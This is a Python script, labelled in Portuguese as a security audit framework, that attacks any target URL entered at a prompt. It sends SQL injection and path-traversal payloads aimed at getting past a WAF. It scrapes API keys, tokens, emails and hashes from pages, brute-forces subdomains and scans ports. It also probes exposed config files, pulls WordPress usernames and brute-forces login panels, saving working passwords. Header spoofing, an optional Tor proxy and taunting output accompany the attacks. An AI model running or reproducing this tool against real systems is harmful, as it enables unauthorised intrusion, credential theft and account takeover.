import json
import os
import random
import re
import socket
import sys
import time
from urllib.parse import urlparse

from bs4 import BeautifulSoup
from colorama import Fore, Style, init

from gevent import socket as gsocket
from gevent.pool import Pool
import requests
# import urllib3

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init()

# --- CONFIGURAÇÕES E CONSTANTES ---
PROXIES = [
    # os.getenv("HTTP_PROXY"),
    # Para usar o Tor localmente descomente abaixo:
    # "socks5://127.0.0.1:9050"
]

USER_AGENTS = [
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101"
        " Firefox/128.0"
    ),
    "Googlebot/2.1 (http://www.google.com/bot.html)",
    "curl/8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0",
    "Python-urllib/3.12",
    "Mozilla/5.0 (X11; CrOS x86_64 15803.0.0) AppleWebKit/537.36",
]

# Estrutura global para armazenamento do relatório consolidado
AUDIT_REPORT = {
    "target": "",
    "waf_detected": "Desconhecido",
    "osint": {},
    "ports": [],
    "waf_bypass_results": [],
    "vulnerabilities": [],
    "credentials": [],
}


def get_random_proxy():
    if not PROXIES:
        return None
    p = random.choice(PROXIES)
    return {"http": p, "https": p}


def detect_waf(target_url, headers):
    print(f"{Fore.BLUE}🛡️ DETECTANDO A PRESENÇA DE WAF NO ALVO...{Style.RESET_ALL}")
    try:
        r = requests.get(
            target_url,
            headers=headers,
            proxies=get_random_proxy(),
            timeout=5,
            verify=True,
        )
        server_header = r.headers.get("Server", "").lower()
        cookie_header = r.headers.get("Set-Cookie", "").lower()

        waf_name = "Nenhum WAF óbvio detectado"
        if (
            "cloudflare" in server_header
            or "cf-ray" in r.headers
            or "__cfduid" in cookie_header
        ):
            waf_name = "Cloudflare WAF"
        elif "cloudfront" in server_header or "x-amz-cf-id" in r.headers:
            waf_name = "AWS CloudFront"
        elif "akamai" in server_header:
            waf_name = "Akamai WAF"
        elif "incap_ses" in cookie_header or "visid_incap" in cookie_header:
            waf_name = "Imperva Incapsula"
        elif "mod_security" in server_header or "sec_debug" in server_header:
            waf_name = "ModSecurity"

        AUDIT_REPORT["waf_detected"] = waf_name
        print(f"{Fore.GREEN}🎯 WAF Identificado: {waf_name}{Style.RESET_ALL}\n")
        return waf_name
    except requests.RequestException:
        return "Erro ao detectar WAF"


def waf_bypass_payloads(base_url):
    u = urlparse(base_url)
    payloads = [
        f"{base_url}' OR 1=1-- -",
        f'{base_url}" OR "x"="x',
        (
            f"{base_url}?id=1%27%20UNION%20SELECT%20null,"
            "concat(user,0x3a,pass)from%20users--"
        ),
        f"{base_url}?param=%2527%2520OR%25201%253D1",
        f"{base_url}#{'A' * 9999}",
        f"{base_url}/{'../' * 5}etc/passwd%00.jpg",
        f"{base_url}?id=1&id='&debug=1&test='",
        f"{base_url.replace(u.netloc, 'evil.com')}",
        f"{base_url}?{''.join(random.choices('abcdef', k=2000))}",
        f"{base_url};",
    ]
    return payloads


def hyper_osint(target):
    print(
        f"{Fore.RED}💀 [HYPER-OSINT] TORCHING {target} WITH EXTREME"
        f" PREJUDICE{Style.RESET_ALL}"
    )

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "close",
        "X-Forwarded-For": f"192.168.0.{random.randint(1, 254)}",
        "Referer": "https://google.com/search?q=youvebeenhacked",
    }

    try:
        r = requests.get(
            target,
            headers=headers,
            proxies=get_random_proxy(),
            timeout=10,
            verify=True,
        )

        emails = re.findall(
            r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", r.text
        )
        phones = re.findall(
            r"(\+55[\s\-]?\(?\d{2}\)?[\s\-]?\d{4,5}[\s\-]?\d{4})"
            r"|(\(?\d{2}\)?[\s\-]?\d{4,5}[\s\-]?\d{4})"
            r"|(\+\d{1,3}[\s\-]?\d{6,14})",
            r.text,
        )
        phones_flat = list(set([p for grupo in phones for p in grupo if p]))

        chApi = re.findall(
            r"(AIza[0-9A-Za-z_\-]{35})"
            r"|(sk_live_[0-9a-zA-Z]{24})"
            r"|(sk_test_[0-9a-zA-Z]{24})"
            r"|(ghp_[0-9a-zA-Z]{36})"
            r"|(AKIA[0-9A-Z]{16})"
            r"|(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)"
            r'|(["\']?api[_\-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-]{16,})["\']?)',
            r.text,
            re.IGNORECASE,
        )
        hashes = re.findall(
            r"\b[a-fA-F0-9]{32}\b|\b[a-fA-F0-9]{40}\b|\b[a-fA-F0-9]{64}\b",
            r.text,
        )
        hashes = [h for h in hashes if len(set(h)) > 4]

        soup = BeautifulSoup(r.text, "lxml")
        title = soup.find("title")
        meta_desc = soup.find("meta", attrs={"name": "description"})

        domain = urlparse(target).netloc
        subdomains = [
            "admin",
            "dev",
            "backup",
            "test",
            "staging",
            "vpn",
            "mail",
            "webmail",
            "api",
            "beta",
        ]
        live_subs = []
        print(f"{Fore.YELLOW}🔍 BRUTE-FORCING SUBDOMAINS...{Style.RESET_ALL}")
        for sub in subdomains:
            try:
                test_domain = f"{sub}.{domain}"
                ip = socket.gethostbyname(test_domain)
                live_subs.append({"subdomain": test_domain, "ip": ip})
                print(f"💥 LIVE: {test_domain} → {ip}")
            except (socket.gaierror, socket.timeout):
                continue

        chApi_flat = [k for grupo in chApi for k in grupo if k]
        script_dir = os.path.dirname(os.path.abspath(__file__))

        if chApi_flat:
            with open(
                os.path.join(script_dir, "chApi_found.txt"),
                "w",
                encoding="utf-8",
            ) as f:
                for ky in chApi_flat:
                    f.write(ky + "\n")

        if hashes:
            with open(
                os.path.join(script_dir, "hashes_found.txt"),
                "w",
                encoding="utf-8",
            ) as f:
                for h in hashes:
                    f.write(h + "\n")

        AUDIT_REPORT["osint"] = {
            "title": title.get_text() if title else "None",
            "meta_description": (meta_desc.get("content") if meta_desc else "None"),
            "emails": list(set(emails)),
            "phones": phones_flat,
            "chApi": chApi_flat,
            "hashes": hashes,
            "subdomains": live_subs,
            "comments_count": len(re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)),
            "server": r.headers.get("Server", "Unknown"),
            "x_powered_by": r.headers.get("X-Powered-By", "None"),
        }

        print(f"{Fore.GREEN}🎯 OSINT Concluído com sucesso.{Style.RESET_ALL}")

    except requests.RequestException as aff:
        print(f"{Fore.RED}💥 FULL OSINT FAILED: {aff}{Style.RESET_ALL}")


def syn_scan_worker(host, port, results, timeout=0.5):
    try:
        sock = gsocket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except OSError:
                service = "unknown"
            print(
                f"{Fore.GREEN}🔓 OPEN PORT: {port}/tcp →"
                f" {service.upper()}{Style.RESET_ALL}"
            )
            results.append({"port": port, "service": service})
        sock.close()
    except (socket.timeout, socket.error):
        return None


def port_scan(host, max_port=1000, threads=500):
    print(
        f"{Fore.RED}💣 [PORT SCAN] ON {host} — {max_port} PORTS —"
        f" {threads} THREADS{Style.RESET_ALL}"
    )
    try:
        target_ip = socket.gethostbyname(host)
    except socket.gaierror:
        print(f"{Fore.RED}❌ Host {host} not resolved.{Style.RESET_ALL}")
        return []

    results = []
    pool = Pool(threads)
    for port in range(1, max_port + 1):
        pool.spawn(syn_scan_worker, target_ip, port, results)
        time.sleep(0.0001)
    pool.join()
    AUDIT_REPORT["ports"] = results
    return results


def test_vulnerability(payload, headers):
    try:
        r = requests.get(
            payload,
            headers=headers,
            proxies=get_random_proxy(),
            timeout=5,
            verify=True,
        )
        body = r.text.lower()
        result = []

        sql_errors = [
            "sql syntax",
            "mysql_fetch",
            "ora-01756",
            "sqlite_error",
            "pg_query",
            "warning: mysql",
            "unclosed quotation",
            "you have an error in your sql",
        ]
        for err in sql_errors:
            if err in body:
                result.append(f"💉 SQLi DETECTADO: '{err}' encontrado")

        if "root:x:0:0" in body or "/bin/bash" in body:
            result.append("📂 PATH TRAVERSAL: /etc/passwd EXPOSTO!")

        if "<script>alert" in body or "xss" in body:
            result.append("⚡ XSS REFLETIDO DETECTADO!")

        if len(r.text) > 300000:
            result.append(f"⚠️ RESPOSTA ANÔMALA: {len(r.text)} bytes — possível dump")

        return result if result else None
    except requests.RequestException:
        return None


def bruteforce_com_usuarios(target_url, usuarios_encontrados):
    if not usuarios_encontrados:
        return

    base = target_url.rstrip("/")
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    paineis = [
        "/wp-login.php",
        "/admin/login",
        "/login/",
        "/administrator/",
        "/wp-admin/",
    ]

    painel_ativos = []
    for painel in paineis:
        try:
            r = requests.get(
                base + painel,
                headers=headers,
                proxies=get_random_proxy(),
                timeout=5,
                verify=True,
            )
            if r.status_code == 200 and len(r.text) > 100:
                painel_ativos.append(base + painel)
        except requests.RequestException:
            continue

    if not painel_ativos:
        return

    wordlist = [
        "123456",
        "password",
        "admin",
        "admin123",
        "root",
        "senha123",
        "P@ssw0rd",
    ]
    for u in usuarios_encontrados:
        wordlist.extend([u, u + "123", u + "@123"])

    for painel_url in painel_ativos:
        for usuario in usuarios_encontrados:
            for senha in wordlist:
                try:
                    session = requests.Session()
                    r = session.get(
                        painel_url,
                        proxies=get_random_proxy(),
                        verify=True,
                        timeout=5,
                    )
                    soup = BeautifulSoup(r.text, "lxml")
                    data = {}
                    for inp in soup.find_all("input"):
                        if inp.get("name"):
                            data[inp.get("name")] = inp.get("value", "")

                    if "log" in data or "wp-login" in painel_url:
                        data["log"] = usuario
                        data["pwd"] = senha
                    else:
                        for campo in ["username", "user", "login"]:
                            if campo in data:
                                data[campo] = usuario
                        for campo in ["password", "pass", "pwd"]:
                            if campo in data:
                                data[campo] = senha

                    r2 = session.post(
                        painel_url,
                        data=data,
                        proxies=get_random_proxy(),
                        verify=True,
                        timeout=5,
                        allow_redirects=True,
                    )

                    sucesso = (
                        any(kw in r2.url for kw in ["wp-admin", "dashboard", "panel"])
                        and r2.status_code == 200
                        and len(r2.text) != len(r.text)
                    )

                    if sucesso:
                        cred = {
                            "painel": painel_url,
                            "usuario": usuario,
                            "senha": senha,
                        }
                        AUDIT_REPORT["credentials"].append(cred)
                        script_dir = os.path.dirname(os.path.abspath(__file__))
                        with open(
                            os.path.join(script_dir, "possiveis_credenciais.txt"),
                            "a",
                            encoding="utf-8",
                        ) as f:
                            f.write(
                                f"VALIDADO - Painel: {painel_url} | User:"
                                f" {usuario} | Pass: {senha}\n"
                            )
                    time.sleep(0.2)
                except requests.RequestException:
                    continue


def enumerar_vulnerabilidades(target_url):
    print(f"{Fore.MAGENTA}🔎 INICIANDO ENUMERAÇÃO ASSÍNCRONA...{Style.RESET_ALL}")
    base = target_url.rstrip("/")
    headers = {"User-Agent": random.choice(USER_AGENTS)}

    checks = {
        "/wp-config.php": "CRITICO - wp-config.php acessível!",
        "/.env": "CRITICO - .env exposto com senhas!",
        "/backup.zip": "CRITICO - Backup ZIP exposto!",
        "/.git/config": "CRITICO - Git exposto!",
        "/phpmyadmin/": "CRITICO - phpMyAdmin exposto!",
        "/wp-json/wp/v2/users": "ALTO - API REST expõe usuários!",
        "/xmlrpc.php": "ALTO - xmlrpc.php ativo!",
        "/admin/": "ALTO - Painel admin acessível!",
        "/package.json": "ALTO - package.json exposto!",
    }

    try:
        r = requests.get(
            base + "/wp-json/wp/v2/users",
            headers=headers,
            proxies=get_random_proxy(),
            timeout=5,
            verify=True,
        )
        if r.status_code == 200:
            users = r.json()
            slugs = [u.get("slug") for u in users if u.get("slug")]
            if slugs:
                bruteforce_com_usuarios(target_url, slugs)
    except requests.RequestException:
        return None

    pool = Pool(20)

    def check_path(path, descricao):
        try:
            url = base + path
            r = requests.get(
                url,
                headers=headers,
                proxies=get_random_proxy(),
                timeout=5,
                verify=True,
                allow_redirects=True,
            )
            if r.status_code == 200 and len(r.text) > 50:
                print(f"{Fore.RED}🔴 {descricao} → {url}{Style.RESET_ALL}")
                AUDIT_REPORT["vulnerabilities"].append(
                    {"url": url, "description": descricao}
                )
        except requests.RequestException:
            return None

    for path, desc in checks.items():
        pool.spawn(check_path, path, desc)
    pool.join()


def gerar_relatorios(target_url):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    AUDIT_REPORT["target"] = target_url

    json_path = os.path.join(script_dir, "relatorio_auditoria.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(AUDIT_REPORT, f, indent=4, ensure_ascii=False)

    html_path = os.path.join(script_dir, "relatorio_auditoria.html")
    vuln_list = "".join(
        [
            f"<li><b>{v['description']}</b>: <a href='{v['url']}'"
            f" target='_blank'>{v['url']}</a></li>"
            for v in AUDIT_REPORT["vulnerabilities"]
        ]
    )
    if not vuln_list:
        vuln_list = "<li>Nenhuma vulnerabilidade crítica direta listada.</li>"

    html_content = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Relatório de Auditoria DevSecOps - {target_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #121212; color: #e0e0e0; padding: 20px; }}
        h1, h2 {{ color: #ff5252; }}
        .card {{ background: #1e1e1e; padding: 15px; margin-bottom: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.5); }}
        ul {{ list-style-type: square; }}
    </style>
</head>
<body>
    <h1>Relatório de Auditoria de Segurança</h1>
    <div class="card">
        <p><strong>Alvo:</strong> {AUDIT_REPORT["target"]}</p>
        <p><strong>WAF Detectado:</strong> {AUDIT_REPORT["waf_detected"]}</p>
        <p><strong>Servidor Web:</strong> {AUDIT_REPORT["osint"].get("server", "Desconhecido")}</p>
    </div>
    <div class="card">
        <h2>Vulnerabilidades Críticas / Diretórios Expostos</h2>
        <ul>
            {vuln_list}
        </ul>
    </div>
    <div class="card">
        <h2>Portas Abertas</h2>
        <p>{len(AUDIT_REPORT["ports"])} portas abertas detectadas.</p>
    </div>
</body>
</html>
"""
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html_content)

    print(
        f"{Fore.GREEN}📊 Relatórios consolidados gerados com sucesso:"
        " relatorio_auditoria.json e"
        f" relatorio_auditoria.html{Style.RESET_ALL}"
    )


def launch_nuclear_osint(target_url):
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    print(
        f"{Fore.MAGENTA}🚀 Iniciando Framework Automatizado Avançado:"
        f" {target_url}{Style.RESET_ALL}"
    )
    parsed = urlparse(target_url)
    host = parsed.netloc

    headers = {"User-Agent": random.choice(USER_AGENTS)}

    detect_waf(target_url, headers)
    hyper_osint(target_url)

    print(
        f"{Fore.RED}🧨 TESTANDO PAYLOADS DE WAF BYPASS COM"
        f" CONCORRÊNCIA...{Style.RESET_ALL}"
    )
    pool = Pool(10)

    def test_bypass(payload):
        try:
            r = requests.get(
                payload,
                headers=headers,
                proxies=get_random_proxy(),
                timeout=5,
                verify=True,
            )
            if r.status_code == 200:
                print(
                    f"{Fore.GREEN}✅ PASSOU ({len(r.text)} bytes):"
                    f" {payload[:60]}...{Style.RESET_ALL}"
                )
                AUDIT_REPORT["waf_bypass_results"].append(
                    {"payload": payload, "status": 200}
                )
        except requests.RequestException:
            return None

    for payload in waf_bypass_payloads(target_url):
        pool.spawn(test_bypass, payload)
    pool.join()

    port_scan(host, max_port=1000)
    enumerar_vulnerabilidades(target_url)
    gerar_relatorios(target_url)
    print(f"{Fore.YELLOW}🎉 AUDITORIA CONCLUÍDA COM SUCESSO!{Style.RESET_ALL}")


if __name__ == "__main__":
    target = input(
        f"{Fore.YELLOW}Enter target (URL or domain):{Style.RESET_ALL} "
    ).strip()
    if not target:
        print("You’re a waste of electricity. Goodbye.")
        sys.exit(1)
    launch_nuclear_osint(target)
